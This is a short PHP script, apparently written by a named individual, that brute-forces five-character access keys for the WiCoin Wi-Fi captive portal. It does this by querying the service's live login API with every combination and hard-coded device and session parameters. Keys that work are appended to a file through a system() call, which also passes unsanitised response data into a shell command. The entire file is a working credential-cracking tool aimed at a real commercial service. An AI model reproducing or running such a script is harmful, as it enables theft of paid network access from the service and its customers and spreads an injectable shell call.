<?php
	//Desarrollado por Lair Nula: diego.error404@gmail.com


	//Caracteres que puede tener una llave WiCoin
	$array=array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z');

	//Parametro que indica que es valida la llave
	$valida="\"Estatus\":true";

	//contador de caracteres totales
	$limite=count($array);

		for($a=0;$a<$limite;$a++){
			
			for($b=0;$b<$limite;$b++){

				for($c=0;$c<$limite;$c++){

					for($d=0;$d<$limite;$d++){
						
						for($e=0;$e<$limite;$e++){
							$llave= $array[$a].$array[$b].$array[$c].$array[$d].$array[$e];
							
							$gen=file_get_contents("http://api.wi-coin.com.mx/WiCoin/login/GetAC?clave=".$llave."&macDispositivo=00-1C-26-AD-07-73&macAP=http://wic.mx/?res=notyet&uamip=10.139.20.1&uamport=3990&challenge=9280c41cc148e9ac5c6aaaaeaadf86d7&called=AC-86-74-32-9B-18&mac=00-1C-26-AD-07-74&ip=10.139.20.202&ssid=WiCoin&nasid=44-IZTP-AC_86_74_32_9B_18&sessionid=55ec993b00000003&userurl=http%3a%2f%2f10.139.20.1%3a3990%2ffavicon.ico");

							$resultado= explode(",", $gen);

							if($resultado[1]==$valida){
								

								system("echo clave ".$llave." de ".$resultado[5]."  >> llaves.txt");
							}
						}
					}
				}
			}

		}

?>